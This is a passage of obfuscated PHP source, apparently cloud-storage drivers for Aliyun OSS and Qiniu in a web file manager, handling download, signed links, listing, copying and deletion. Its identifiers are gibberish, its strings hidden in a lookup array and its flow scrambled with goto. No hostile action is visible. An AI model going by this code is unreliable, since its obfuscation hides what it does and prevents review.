$E°±šŸç†…->getListPart(); $D¼šÊ¯Í‡“ = array(); foreach ($D––´…½¨ as $C¿ëø–¯Ø) { $D¼šÊ¯Í‡“[] = array($f§«µ¹­Öó[1282] => $C¿ëø–¯Ø->getPartNumber(), $f§«µ¹­Öó[1283] => trim($C¿ëø–¯Ø->getETag(), $f§«µ¹­Öó[126])); } goto cÁŞÒ³Ø‚; AÌ£ˆê³¼Ü: } public function download($CŒ†â„Îš†, $a©ĞŠáÄƒ¨) { if ($this->isFolder($CŒ†â„Îš†)) { return !1; } try { $A¦”µ‡ˆôÛ = array(OSS\OssClient::OSS_FILE_DOWNLOAD => $a©ĞŠáÄƒ¨); $A¦”µ‡ˆôÛ = $this->trafficLimit($_SERVER[Ü˜][119], $A¦”µ‡ˆôÛ); $this->client->getObject($this->bucket, $this->pathEncode($CŒ†â„Îš†), $A¦”µ‡ˆôÛ); } catch (OSS\Core\OssException $C‚ÇçÆÛÅò) { return !1; } return $a©ĞŠáÄƒ¨; } public function fileSubstr($b¡³óˆ¨‡¢, $B›˜Ÿš¬îÏ = 0, $dœ¨…‰ô˜ = false) { if ($B›˜Ÿš¬îÏ === -1) { $e‹‡Üº·õò = array(); } else { if ($dœ¨…‰ô˜ === !1) { $BìïÅÉ™îš = $this->size($b¡³óˆ¨‡¢); } else { $BìïÅÉ™îš = $B›˜Ÿš¬îÏ + $dœ¨…‰ô˜ - 1; } $e‹‡Üº·õò = array(OSS\OssClient::OSS_RANGE => "{$B›˜Ÿš¬îÏ}\x2d{$BìïÅÉ™îš}"); } try { return $this->client->getObject($this->bucket, $this->pathEncode($b¡³óˆ¨‡¢), $e‹‡Üº·õò); } catch (OSS\Core\OssException $AÔ–—½ŒíÅ) { think_exception($AÔ–—½ŒíÅ->getMessage()); return !1; } } private function trafficLimit($e˜÷®æäÇ®, $Cº¼¢ÑŒÇá = array()) { goto C´ÍŸ„÷öª; C´ÍŸ„÷öª: $cäŸ–ÖÍ’ =& $_SERVER[Ü˜]; if ($e˜÷®æäÇ® == $cäŸ–ÖÍ’[1289] && $this->isUploadServer() || $e˜÷®æäÇ® == $cäŸ–ÖÍ’[119] && $this->isFileOutServer()) { return $Cº¼¢ÑŒÇá; } $c¼Š­‚ëˆ› = floatval($GLOBALS[$cäŸ–ÖÍ’[6]][$cäŸ–ÖÍ’[98]][$cäŸ–ÖÍ’[117]][$e˜÷®æäÇ®]) * 1024 * 1024 * 8; goto F¿“º¼ÛŒ’; F¿“º¼ÛŒ’: if (!$c¼Š­‚ëˆ›) { return $Cº¼¢ÑŒÇá; } $c¼Š­‚ëˆ› = $c¼Š­‚ëˆ› < 819200 ? 819200 : ($c¼Š­‚ëˆ› > 838860800 ? 838860800 : $c¼Š­‚ëˆ›); $Cº¼¢ÑŒÇá[OSS\OssClient::OSS_TRAFFIC_LIMIT] = intval($c¼Š­‚ëˆ›); goto C¾„Ã‹š›‘; C¾„Ã‹š›‘: return $Cº¼¢ÑŒÇá; goto Dôè‹‹¾ëŞ; Dôè‹‹¾ëŞ: } public function link($EÆ‘¨ÙÓĞ, $A×õ©ğ‹Áª = array()) { $bõÕÊšŞªï =& $_SERVER[Ü˜]; if (!$this->exist($EÆ‘¨ÙÓĞ) || $this->isFolder($EÆ‘¨ÙÓĞ)) { return !1; } try { $A×õ©ğ‹Áª = $this->trafficLimit($bõÕÊšŞªï[119], $A×õ©ğ‹Áª); $c£¬÷Ò«á = $this->client->signUrl($this->bucket, $this->pathEncode($EÆ‘¨ÙÓĞ), 3600 * 12, $bõÕÊšŞªï[238], $A×õ©ğ‹Áª); return $this->getCdnLink($c£¬÷Ò«á); } catch (OSS\Core\OssException $D‡›­ËÛÕä) { return !1; } } public function fileOut($aíšù—ÀÕ, $dïâ•íßù = false, $DÏ«¡½‡ò‹ = false, $FË°¦¡ºÌ‰ = '') { goto Dçí Õ½Ú·; aß“—–§Üš: $aàò»ÆÙÖÛ = $this->link($aíšù—ÀÕ, $D£ªèÛØÜ†); $this->fileOutLink($aàò»ÆÙÖÛ); goto fĞæÊæÉ³; ešÎ¤•Õˆ: $dïâ•íßù = $dïâ•íßù ? $eÅôá°ˆùô[224] : $eÅôá°ˆùô[225]; $D£ªèÛØÜ† = array(OSS\OssClient::OSS_SUB_RESOURCE => $eÅôá°ˆùô[1300] . rawurlencode("{$dïâ•íßù}\x3b\x66\151\154\145\x6e\x61\x6d\x65\75{$DÏ«¡½‡ò‹}")); $D£ªèÛØÜ†[OSS\OssClient::OSS_SUB_RESOURCE] .= $eÅôá°ˆùô[1301] . rawurlencode($c¦³¶ÍÑËŠ); goto aß“—–§Üš; Dçí Õ½Ú·: $eÅôá°ˆùô =& $_SERVER[Ü˜]; if ($this->isFileOutServer()) { return $this->fileOutServer($aíšù—ÀÕ, $dïâ•íßù, $DÏ«¡½‡ò‹, $FË°¦¡ºÌ‰); } if (!$DÏ«¡½‡ò‹) { $DÏ«¡½‡ò‹ = $this->pathThis($aíšù—ÀÕ); } goto Bæ¿“ë”Ï´; Bæ¿“ë”Ï´: $DÏ«¡½‡ò‹ = rawurlencode($DÏ«¡½‡ò‹); $c¦³¶ÍÑËŠ = get_file_mime(get_path_ext($DÏ«¡½‡ò‹)); if ($c¦³¶ÍÑËŠ == $eÅôá°ˆùô[223]) { return parent::fileOut($aíšù—ÀÕ, $dïâ•íßù, $DÏ«¡½‡ò‹, $FË°¦¡ºÌ‰); } goto ešÎ¤•Õˆ; fĞæÊæÉ³: } public function fileOutServer($EßÄùå´ä, $bÔÍàµĞ°á = false, $déŸ¾é³á˜ = false, $dªìª‰øŠê = '') { parent::fileOut($EßÄùå´ä, $bÔÍàµĞ°á, $déŸ¾é³á˜, $dªìª‰øŠê); } public function fileOutImage($CÂ›ŠÄ¡£¢, $fˆÆ×®Š¿ = 250) { $D‰¬‰Õ£õÙ = array(OSS\OssClient::OSS_PROCESS => $_SERVER[Ü˜][1302] . $fˆÆ×®Š¿); $C· £“®ÛÎ = $this->link($CÂ›ŠÄ¡£¢, $D‰¬‰Õ£õÙ); $this->fileOutLink($C· £“®ÛÎ); } public function fileOutImageServer($Cˆ´¾ÚšÓö, $CóÜ·â¹›´ = 250) { parent::fileOutImage($Cˆ´¾ÚšÓö, $CóÜ·â¹›´); } public function fileOutLink($FĞ ´†ã‡”) { $fÛ‰‚ÎÊÛ =& $_SERVER[Ü˜]; if (!$this->isCdnHost() && substr($FĞ ´†ã‡”, 0, 7) == $fÛ‰‚ÎÊÛ[1205]) { $FĞ ´†ã‡” = $fÛ‰‚ÎÊÛ[1206] . substr($FĞ ´†ã‡”, 7); } header($fÛ‰‚ÎÊÛ[169] . $FĞ ´†ã‡”); die; } public function hashMd5($EÅ–‰Ï©ˆ¢, $f¢Ì¦ÆÑ±• = '') { $FĞØË‘ÈĞ =& $_SERVER[Ü˜]; $E‚ƒìë»š– = $this->_objectMeta($EÅ–‰Ï©ˆ¢); if (!$E‚ƒìë»š–) { return $FĞØË‘ÈĞ[33]; } if (!isset($E‚ƒìë»š–[$FĞØË‘ÈĞ[1278]]) && !empty($f¢Ì¦ÆÑ±•)) { $c‘ˆƒ³¾º÷ = $this->updateObjMeta($EÅ–‰Ï©ˆ¢, array($FĞØË‘ÈĞ[1278] => $f¢Ì¦ÆÑ±•)); $E‚ƒìë»š–[$FĞØË‘ÈĞ[1278]] = $c‘ˆƒ³¾º÷ ? $f¢Ì¦ÆÑ±• : $FĞØË‘ÈĞ[33]; } return isset($E‚ƒìë»š–[$FĞØË‘ÈĞ[1278]]) ? strtolower($E‚ƒìë»š–[$FĞØË‘ÈĞ[1278]]) : $FĞØË‘ÈĞ[33]; } public function size($f£ÇçŞŠ‡¡) { $e ÒğŞ•‰ = $this->objectMeta($f£ÇçŞŠ‡¡); return $e ÒğŞ•‰ ? $e ÒğŞ•‰[$_SERVER[Ü˜][88]] : 0; } public function info($Dæ´‹‰£) { if ($this->isFolder($Dæ´‹‰£)) { return $this->folderInfo($Dæ´‹‰£); } else { if ($this->isFile($Dæ´‹‰£)) { return $this->fileInfo($Dæ´‹‰£); } } return !1; } public function exist($fê‚ÖğœÙ›) { return $this->isFile($fê‚ÖğœÙ›) || $this->isFolder($fê‚ÖğœÙ›); } public function isFile($aù ¼Ô‚Ï) { return !$this->isFolder($aù ¼Ô‚Ï) && $this->objectMeta($aù ¼Ô‚Ï); } public function isFolder($aùÁøœÑÖà) { return $this->cacheMethod($_SERVER[Ü˜][209], $aùÁøœÑÖà); } protected function objectMeta($b¥¨èÉìë) { return $this->cacheMethod($_SERVER[Ü˜][210], $b¥¨èÉìë); } protected function _objectMeta($EºÄ¨Ä±Ğ) { $FÉ”ŞÕÒ =& $_SERVER[Ü˜]; try { $e„†ÇòöÑ… = $this->client->getObjectMeta($this->bucket, $this->pathEncode($EºÄ¨Ä±Ğ)); } catch (OSS\Core\OssException $CÆÑµäŠ§ø) { $e„†ÇòöÑ… = !1; } if ($e„†ÇòöÑ…) { $e„†ÇòöÑ…[$FÉ”ŞÕÒ[88]] = intval($e„†ÇòöÑ…[$FÉ”ŞÕÒ[1276]]); } return $e„†ÇòöÑ…; } protected function _isFolder($f³Ã¨§Ü£˜) { $Fç¶è±õİã =& $_SERVER[Ü˜]; if ($f³Ã¨§Ü£˜ == $Fç¶è±õİã[33] || $f³Ã¨§Ü£˜ == $Fç¶è±õİã[8]) { return !0; } $AÆîÆôµŸ = array($Fç¶è±õİã[1272] => $Fç¶è±õİã[8], $Fç¶è±õİã[1273] => rtrim($f³Ã¨§Ü£˜, $Fç¶è±õİã[8]) . $Fç¶è±õİã[8], $Fç¶è±õİã[1274] => 1, $Fç¶è±õİã[1275] => $Fç¶è±õİã[33]); $BÏäèÍä‘„ = $this->client->listObjects($this->bucket, $AÆîÆôµŸ); if ($BÏäèÍä‘„->getObjectList() || $BÏäèÍä‘„->getPrefixList()) { return !0; } return !1; } } class PathDriverQiniu extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $region = ''; protected $bucket = ''; protected $auth = null; protected $client = null; protected $config = null; protected $bucketManager = null; public $ioUploadServer = "\60"; public $ioFileOutServer = "\60"; public function __construct($eØ³Şº³ç®) { parent::__construct(); require_once SDK_DIR . $_SERVER[Ü˜][1303]; $this->_init($eØ³Şº³ç®); } public function _init($d‡Õ†óº¸) { goto BõÜç„º™ğ; BõÜç„º™ğ: $fÒÏ½ ŞŞ– =& $_SERVER[Ü˜]; foreach ($d‡Õ†óº¸ as $A–¤‰ÔÊ => $A•ÏÀ†ÌÄà) { if (isset($this->{$A–¤‰ÔÊ})) { $this->{$A–¤‰ÔÊ} = $A•ÏÀ†ÌÄà; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($fÒÏ½ ŞŞ–[1304] . LNG($fÒÏ½ ŞŞ–[1263])); } goto cŒ‰ŒÓğ…ˆ; cŒ‰ŒÓğ…ˆ: $this->auth = new Qiniu\Auth($this->accessKey, $this->secret); $this->client = new Qiniu\Rtc\AppClient($this->auth); $this->config = new \Qiniu\Config(); goto Dà‘ñ††½ö; Dà‘ñ††½ö: $this->bucketManager = new \Qiniu\Storage\BucketManager($this->auth, $this->config); goto D’µµ—ˆ¬; D’µµ—ˆ¬: } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function mkfile($f²õÃµ…Ë¾, $bğôÈØà = '', $A¹áØÑ‰Ë‹ = REPEAT_RENAME) { if ($this->setContent($f²õÃµ…Ë¾, $bğôÈØà)) { return $this->getPathOuter($f²õÃµ…Ë¾); } return !1; } public function mkdir($DÙ‘íñ©Œè, $bôŞˆã³¿´ = REPEAT_SKIP) { goto EĞóµ¬íù; EĞóµ¬íù: $C¼Áö¯ƒ”• =& $_SERVER[Ü˜]; $E’öç «Àã = trim($DÙ‘íñ©Œè, $C¼Áö¯ƒ”•[8]); if ($this->_isFolder($E’öç «Àã)) { return $this->getPathOuter($E’öç «Àã); } goto BàÉğÜ˜­¸; BàÉğÜ˜­¸: $DÙ‘íñ©Œè = $E’öç «Àã . $C¼Áö¯ƒ”•[8]; $D¿¢Æ§ÂÙÖ = get_path_this($E’öç «Àã); $a‡ó‰ô¤Ä = $DÙ‘íñ©Œè . $D¿¢Æ§ÂÙÖ; goto d÷ÚÚ¥‡ÜÚ; d÷ÚÚ¥‡ÜÚ: if (!$this->mkfile($a‡ó‰ô¤Ä)) { return !1; } if (!$this->moveFile($a‡ó‰ô¤Ä, $DÙ‘íñ©Œè)) { $this->delFile($a‡ó‰ô¤Ä); return !1; } return $this->getPathOuter($E’öç «Àã); goto bè¶šÙõ‰˜; bè¶šÙõ‰˜: } public function copyFile($cÀ†ô÷ÂÒŸ, $CÜóêÑâË) { $CäšËäŒ·å = $this->bucketManager->copy($this->bucket, $cÀ†ô÷ÂÒŸ, $this->bucket, $CÜóêÑâË, !0); return $CäšËäŒ·å ? !1 : $this->getPathOuter($CÜóêÑâË); } public function moveFile($eÑ¸”‚˜²ï, $e½“½˜›„‚) { $D‰êÀ¯Å¾° = $this->bucketManager->move($this->bucket, $eÑ¸”‚˜²ï, $this->bucket, $e½“½˜›„‚, !0); return $D‰êÀ¯Å¾° ? !1 : $this->getPathOuter($e½“½˜›„‚); } public function delFile($CÈ™ç‹Èè) { if (!$this->exist($CÈ™ç‹Èè)) { return !0; } $F•ìó¯¨ß = $this->bucketManager->delete($this->bucket, $CÈ™ç‹Èè); return $F•ìó¯¨ß ? !1 : !0; } public function delFolder($dïöø°ˆ‚“) { goto Bä¶³‹È×; Bä¶³‹È×: $eÇ¼ì¿‰ÎÙ =& $_SERVER[Ü˜]; if (!$this->exist($dïöø°ˆ‚“)) { return !0; } $this->listItemCache = !1; goto Eµîˆ¬ã‹ ; Eè†“ï·Ñ: if (!empty($dïöø°ˆ‚“) && $dïöø°ˆ‚“ !== $eÇ¼ì¿‰ÎÙ[201] && !in_array($FÕÎÄö‹¨´, $BêšŞÁŠò®[$eÇ¼ì¿‰ÎÙ[85]])) { $BêšŞÁŠò®[$eÇ¼ì¿‰ÎÙ[85]][] = $FÕÎÄö‹¨´; } $EŠÉ¤Ü®¯Ë = $this->delByBatch($BêšŞÁŠò®[$eÇ¼ì¿‰ÎÙ[84]]); if (!$EŠÉ¤Ü®¯Ë) { return !1; } goto Aõ‹ÆÕØ·ù; Eµîˆ¬ã‹ : $BêšŞÁŠò® = $this->fileList($dïöø°ˆ‚“); $this->listItemCache = !0; $FÕÎÄö‹¨´ = trim($dïöø°ˆ‚“, $eÇ¼ì¿‰ÎÙ[8]) . $eÇ¼ì¿‰ÎÙ[8]; goto Eè†“ï·Ñ; Aõ‹ÆÕØ·ù: $EŠÉ¤Ü®¯Ë = $this->delByBatch($BêšŞÁŠò®[$eÇ¼ì¿‰ÎÙ[85]]); if (!$EŠÉ¤Ü®¯Ë) { return !1; } return $this->delFile($FÕÎÄö‹¨´); goto Bº„×àâ÷; Bº„×àâ÷: } private function delByBatch($aÔ®Ğš–Ô¬) { foreach (array_chunk($aÔ®Ğš–Ô¬, 1000) as $Aá°²¿½¤æ) { $DàÔÙÄ¹‘ = $this->bucketManager->buildBatchDelete($this->bucket, $Aá°²¿½¤æ); list($C»ç—Ï“Ï‡, $C¥ÒŒ°§Âø) = $this->bucketManager->batch($DàÔÙÄ¹‘); if ($C¥ÒŒ°§Âø) { return !1; } } return !0; } public function rename($EŠ’äñ™ô, $D•¸»ƒğ×) { return $this->renameObject($EŠ’äñ™ô, $D•¸»ƒğ×); } public function fileInfo($DƒãÃ¤Šçğ, $e±òå´à = false, $A¸ª±Æõ‚’ = array()) { goto aÑã ­²’; cî§´Ş¼ÀÅ: if (isset($A¸ª±Æõ‚’[$FÊê›Ÿ¬æª[1306]])) { $C¼ÕİÂ·¡[$FÊê›Ÿ¬æª[94]] = substr($A¸ª±Æõ‚’[$FÊê›Ÿ¬æª[1306]] . $FÊê›Ÿ¬æª[33], 0, 10); } if (isset($A¸ª±Æõ‚’[$FÊê›Ÿ¬æª[1305]])) { $C¼ÕİÂ·¡[$FÊê›Ÿ¬æª[88]] = $A¸ª±Æõ‚’[$FÊê›Ÿ¬æª[1305]]; } return $C¼ÕİÂ·¡; goto E­à£ºïàç; eğ¯ì†²Á: $C¼ÕİÂ·¡[$FÊê›Ÿ¬æª[204]] = $C¼ÕİÂ·¡[$FÊê›Ÿ¬æª[94]] = 0; $C¼ÕİÂ·¡[$FÊê›Ÿ¬æª[205]] = $C¼ÕİÂ·¡[$FÊê›Ÿ¬æª[206]] = !0; if (empty($A¸ª±Æõ‚’)) { $A¸ª±Æõ‚’ = $this->objectMeta($DƒãÃ¤Šçğ); if (!$A¸ª±Æõ‚’) { return $C¼ÕİÂ·¡; } } goto cî§´Ş¼ÀÅ; aÑã ­²’: $FÊê›Ÿ¬æª =& $_SERVER[Ü˜]; $C¼ÕİÂ·¡ = array($FÊê›Ÿ¬æª[28] => $this->pathThis($DƒãÃ¤Šçğ), $FÊê›Ÿ¬æª[86] => $this->getPathOuter($FÊê›Ÿ¬æª[8] . $DƒãÃ¤Šçğ), $FÊê›Ÿ¬æª[29] => $FÊê›Ÿ¬æª[203], $FÊê›Ÿ¬æª[88] => isset($A¸ª±Æõ‚’[$FÊê›Ÿ¬æª[1305]]) ? $A¸ª±Æõ‚’[$FÊê›Ÿ¬æª[1305]] : 0, $FÊê›Ÿ¬æª[178] => $this->ext($DƒãÃ¤Šçğ)); if ($e±òå´à) { return $C¼ÕİÂ·¡; } goto eğ¯ì†²Á; E­à£ºïàç: } public function folderInfo($aš×“Ó†Çø, $B¿øÕó¼¹Â = false) { goto Dˆ½·”ÈÈ¸; Dˆ½·”ÈÈ¸: $D¼ì·¢ÓŞŞ =& $_SERVER[Ü˜]; $FÈˆë…èé‹ = array($D¼ì·¢ÓŞŞ[28] => $this->pathThis($aš×“Ó†Çø), $D¼ì·¢ÓŞŞ[86] => $this->getPathOuter($D¼ì·¢ÓŞŞ[8] . $aš×“Ó†Çø), $D¼ì·¢ÓŞŞ[29] => $D¼ì·¢ÓŞŞ[87]); if ($B¿øÕó¼¹Â) { return $FÈˆë…èé‹; } goto a¿¹¢å±êÕ; bÜÔËñÀôÀ: $eµÏğ¦ÕºÊ = $this->objectMeta($aš×“Ó†Çø); if (isset($eµÏğ¦ÕºÊ[$D¼ì·¢ÓŞŞ[1306]])) { $FÈˆë…èé‹[$D¼ì·¢ÓŞŞ[94]] = substr($eµÏğ¦ÕºÊ[$D¼ì·¢ÓŞŞ[1306]] . $D¼ì·¢ÓŞŞ[33], 0, 10); } return $FÈˆë…èé‹; goto f˜ÈÌäù; a¿¹¢å±êÕ: $FÈˆë…èé‹[$D¼ì·¢ÓŞŞ[204]] = $FÈˆë…èé‹[$D¼ì·¢ÓŞŞ[94]] = 0; $FÈˆë…èé‹[$D¼ì·¢ÓŞŞ[205]] = $FÈˆë…èé‹[$D¼ì·¢ÓŞŞ[206]] = !0; $aš×“Ó†Çø = rtrim($aš×“Ó†Çø, $D¼ì·¢ÓŞŞ[8]) . $D¼ì·¢ÓŞŞ[8]; goto bÜÔËñÀôÀ; f˜ÈÌäù: } public function listPath($AÚÔ±ù§‡Ù, $fŒŒ¼ê†£¿ = false) { $EùŒ‰à• =& $_SERVER[Ü˜]; $Bª›’Â‚åÄ = $this->fileList($AÚÔ±ù§‡Ù, $EùŒ‰à•[8], !0); foreach ($Bª›’Â‚åÄ[$EùŒ‰à•[85]] as $Dè÷¡ÒõæĞ => $bÑõßİ³Ì£) { $Bª›’Â‚åÄ[$EùŒ‰à•[85]][$Dè÷¡ÒõæĞ] = $this->folderInfo($bÑõßİ³Ì£, $fŒŒ¼ê†£¿); } foreach ($Bª›’Â‚åÄ[$EùŒ‰à•[84]] as $Dè÷¡ÒõæĞ => $bÑõßİ³Ì£) { $Bª›’Â‚åÄ[$EùŒ‰à•[84]][$Dè÷¡ÒõæĞ] = $this->fileInfo($bÑõßİ³Ì£[$EùŒ‰à•[103]], $fŒŒ¼ê†£¿, $bÑõßİ³Ì£); } return $Bª›’Â‚åÄ; } public function has($BóÉ¨ã­ÚÑ, $F­°Ñë©½á = false, $e‡òœê„»ä = true) { goto CÆœŒÊÉ•®; aŠÆÇ²²‡œ: $aä“øš¾«× = $F÷ˆãÊ©² = 0; while (!0) { check_abort(); list($bğ®–‚Äœ™, $Câ¥¯ß ğ) = $this->bucketManager->listFiles($this->bucket, $b îë‰¥¦, $CÆÛÕ‹Ò²Œ, $f¾àö‹„ğ¼, $bÛ°¾ˆìâß); if ($Câ¥¯ß ğ) { break; } $CÆÛÕ‹Ò²Œ = array_key_exists($Aç²ç…‚¤¬[1275], $bğ®–‚Äœ™) ? $CÆÛÕ‹Ò²Œ = $bğ®–‚Äœ™[$Aç²ç…‚¤¬[1307]] : $Aç²ç…‚¤¬[33]; if ($F­°Ñë©½á) { if (!empty($bğ®–‚Äœ™[$Aç²ç…‚¤¬[1308]])) { $aä“øš¾«× += count($bğ®–‚Äœ™[$Aç²ç…‚¤¬[1308]]); } if (!empty($bğ®–‚Äœ™[$Aç²ç…‚¤¬[1309]])) { $F÷ˆãÊ©² += count($bğ®–‚Äœ™[$Aç²ç…‚¤¬[1309]]); } if ($CÆÛÕ‹Ò²Œ === $Aç²ç…‚¤¬[33]) { break; } continue; } if ($e‡òœê„»ä) { if (!empty($bğ®–‚Äœ™[$Aç²ç…‚¤¬[1308]])) { return !0; } } else { if (!empty($bğ®–‚Äœ™[$Aç²ç…‚¤¬[1309]])) { return !0; } } if ($CÆÛÕ‹Ò²Œ === $Aç²ç…‚¤¬[33]) { break; } } if ($F­°Ñë©½á) { return array($Aç²ç…‚¤¬[213] => $aä“øš¾«×, $Aç²ç…‚¤¬[214] => $F÷ˆãÊ©²); } goto fÍâë¥ß§±; câ·ƒùß¸: $CÆÛÕ‹Ò²Œ = $Aç²ç…‚¤¬[33]; $f¾àö‹„ğ¼ = 500; $bÛ°¾ˆìâß = $Aç²ç…‚¤¬[8]; goto aŠÆÇ²²‡œ; fÍâë¥ß§±: return !1; goto FÒÏåÒ°¦í; CÆœŒÊÉ•®: $Aç²ç…‚¤¬ =& $_SERVER[Ü˜]; $BóÉ¨ã­ÚÑ = trim($BóÉ¨ã­ÚÑ, $Aç²ç…‚¤¬[8]); $b îë‰¥¦ = empty($BóÉ¨ã­ÚÑ) && $BóÉ¨ã­ÚÑ !== $Aç²ç…‚¤¬[201] ? $Aç²ç…‚¤¬[33] : $BóÉ¨ã­ÚÑ . $Aç²ç…‚¤¬[8]; goto câ·ƒùß¸; FÒÏåÒ°¦í: } public function listAll($Bìùå›á„) { $EÂ²Ò¦”Ä =& $_SERVER[Ü˜]; $CÃ¯‡¶µËÉ = $this->fileList($Bìùå›á„, $EÂ²Ò¦”Ä[33], !0); $Bãíä–è¢‘ = array(); foreach ($CÃ¯‡¶µËÉ[$EÂ²Ò¦”Ä[84]] as $B†‡Ğ¸ñÂæ) { $Bãíä–è¢‘[$B†‡Ğ¸ñÂæ[$EÂ²Ò¦”Ä[103]]] = $B†‡Ğ¸ñÂæ[$EÂ²Ò¦”Ä[88]]; } foreach ($CÃ¯‡¶µËÉ[$EÂ²Ò¦”Ä[85]] as $B†‡Ğ¸ñÂæ) { if (is_string($B†‡Ğ¸ñÂæ)) { $Bãíä–è¢‘[$B†‡Ğ¸ñÂæ] = 0; } } return $this->listAllFiles($Bìùå›á„, array_keys($Bãíä–è¢‘), $Bãíä–è¢‘); } private function fileList($B§µÚáÒ×ˆ, $bˆ´ÊÉ•º‚ = '', $D§ø¡ôõ» = 0) { goto BÅ¢·‘¿µØ; BÅ¢·‘¿µØ: $a‰çëÏÎù =& $_SERVER[Ü˜]; $B§µÚáÒ×ˆ = trim($B§µÚáÒ×ˆ, $a‰çëÏÎù[8]); $e±‰‡ŞÚˆà = empty($B§µÚáÒ×ˆ) && $B§µÚáÒ×ˆ !== $a‰çëÏÎù[201] ? $a‰çëÏÎù[33] : $B§µÚáÒ×ˆ . $a‰çëÏÎù[8]; goto F–ª³Í†Š; B¾¼¼¬ùù: $f¤Ú ƒ§†Š = $DãÆ‚ô˜Åõ = array(); while (!0) { check_abort(); list($c–Ô¯ÈÜ…“, $eÈ½ÌÂŠÑ¾) = $this->bucketManager->listFiles($this->bucket, $e±‰‡ŞÚˆà, $A·Ë…æç, $DãŞ¦ƒØñß, $bˆ´ÊÉ•º‚); if ($eÈ½ÌÂŠÑ¾) { break; } $A·Ë…æç = array_key_exists($a‰çëÏÎù[1275], $c–Ô¯ÈÜ…“) ? $A·Ë…æç = $c–Ô¯ÈÜ…“[$a‰çëÏÎù[1307]] : $a‰çëÏÎù[33]; $dµğÉˆª‹Ê = isset($c–Ô¯ÈÜ…“[$a‰çëÏÎù[1308]]) ? $c–Ô¯ÈÜ…“[$a‰çëÏÎù[1308]] : array(); $E­ğ§Âˆ§» = isset($c–Ô¯ÈÜ…“[$a‰çëÏÎù[1309]]) ? $c–Ô¯ÈÜ…“[$a‰çëÏÎù[1309]] : array(); foreach ($dµğÉˆª‹Ê as $DÕÈÓˆ½ÀÃ) { goto Fƒ²éµÔ; cÕÅ¾éçºŠ: $DÕÈÓˆ½ÀÃ[$a‰çëÏÎù[88]] = $dÍ´È¨Ç„™; $Dó‰‘åî‘  = $dÍ´È¨Ç„™ == 0 && substr($eƒ¢ø´Êç¤, strlen($eƒ¢ø´Êç¤) - 1, 1) == $a‰çëÏÎù[8] ? !0 : !1; if ($d‡ÇÃÄ³‘) { $this->cacheMethod($a‰çëÏÎù[209], $eƒ¢ø´Êç¤, $Dó‰‘åî‘ ); $this->cacheMethod($a‰çëÏÎù[210], $eƒ¢ø´Êç¤, $DÕÈÓˆ½ÀÃ); } goto fˆëİáñä; fˆëİáñä: if ($Dó‰‘åî‘ ) { $f¤Ú ƒ§†Š[] = $eƒ¢ø´Êç¤; continue; } $DãÆ‚ô˜Åõ[] = $D§ø¡ôõ» ? $DÕÈÓˆ½ÀÃ : $eƒ¢ø´Êç¤; goto eİÀ²Î»·Í; Fƒ²éµÔ: if ($DÕÈÓˆ½ÀÃ[$a‰çëÏÎù[103]] == $e±‰‡ŞÚˆà) { continue; } $eƒ¢ø´Êç¤ = $DÕÈÓˆ½ÀÃ[$a‰çëÏÎù[103]]; $dÍ´È¨Ç„™ = $DÕÈÓˆ½ÀÃ[$a‰çëÏÎù[1305]]; goto cÕÅ¾éçºŠ; eİÀ²Î»·Í: } foreach ($E­ğ§Âˆ§» as $eƒ¢ø´Êç¤) { if ($eƒ¢ø´Êç¤ == $e±‰‡ŞÚˆà) { continue; } $f¤Ú ƒ§†Š[] = $eƒ¢ø´Êç¤; if ($d‡ÇÃÄ³‘) { $this->cacheMethod($a‰çëÏÎù[209], $eƒ¢ø´Êç¤, !0); } } if ($A·Ë…æç === $a‰çëÏÎù[33]) { break; } } if ($d‡ÇÃÄ³‘) { $this->cacheMethod($a‰çëÏÎù[209], $B§µÚáÒ×ˆ, !0); } goto B‰Ù¸ğİÖº; F–ª³Í†Š: $A·Ë…æç = $a‰çëÏÎù[33]; $DãŞ¦ƒØñß = 1000; $d‡ÇÃÄ³‘ = $this->listItemCache === !1 ? !1 : !0; goto B¾¼¼¬ùù; B‰Ù¸ğİÖº: return array($a‰çëÏÎù[85] => $f¤Ú ƒ§†Š, $a‰çëÏÎù[84] => $DãÆ‚ô˜Åõ); goto bÊÌ®½À‰; bÊÌ®½À‰: } public function canRead($d«Ç¡İÒõ) { return $this->exist($d«Ç¡İÒõ) ? !0 : !1; } public function canWrite($BÁ¿ßÂÏ†) { return $this->exist($BÁ¿ßÂÏ†) ? !0 : !1; } public function getContent($DÀøàòÎìÄ) { return $this->fileSubstr($DÀøàòÎìÄ, 0, -1); } public function setContent($dÏ‡Á»ÕÂ¥, $d©ì»ÏĞÑ = '') { $e¤¹â®Œˆñ = $this->tempFile($this->pathThis($dÏ‡Á»ÕÂ¥)); file_put_contents($e¤¹â®Œˆñ, $d©ì»ÏĞÑ); if ($this->upload($dÏ‡Á»ÕÂ¥, $e¤¹â®Œˆñ)) { $this->tempFileRemve($e¤¹â®Œˆñ); return !0; } return !1; } public function refreshUrls($BŒ…Å†©Ô¤) { goto c²à‹Ë«¶ï; c²à‹Ë«¶ï: $a‚‘±–ó¿İ =& $_SERVER[Ü˜]; $fÍ°Ÿ™‹ = array(); if (is_array($BŒ…Å†©Ô¤)) { foreach ($BŒ…Å†©Ô¤ as $A…ï¤õ´ÛÃ) { $fÍ°Ÿ™‹[] = $this->link($A…ï¤õ´ÛÃ); } } else { $fÍ°Ÿ™‹[] = $this->link($BŒ…Å†©Ô¤); } goto aÏˆ§ì¦Ÿí; aÏˆ§ì¦Ÿí: $a¯æ‹ïº = new Qiniu\Cdn\CdnManager($this->auth); list($A‡¾ÖÚ‘äÏ, $DøÚÈÚÕöÅ) = $a¯æ‹ïº->refreshUrls($fÍ°Ÿ™‹); if ($DøÚÈÚÕöÅ) { return !1; } goto C¤á¢Ÿ­ƒ; C¤á¢Ÿ­ƒ: return $A‡¾ÖÚ‘äÏ[$a‚‘±–ó¿İ[1079]] == $a‚‘±–ó¿İ[729] ? !0 : !1; goto BŠ¿Õø½Ğ¯; BŠ¿Õø½Ğ¯: } public function fileSubstr($DÙ¤³ÉÖÓÏ, $e‡µ˜Åå‡¼, $B÷ÏÙ†Ä®) { $fÚ×ì…ñõÏ =& $_SERVER[Ü˜]; if (!($DĞ‚³¥ÄÂ± = $this->link($DÙ¤³ÉÖÓÏ))) { return !1; } $B‚Ö…“œõª = !1; if ($B÷ÏÙ†Ä® > 0) { $Dîì„…ê«ç = $e‡µ˜Åå‡¼ + $B÷ÏÙ†Ä® - 1; $B‚Ö…“œõª = 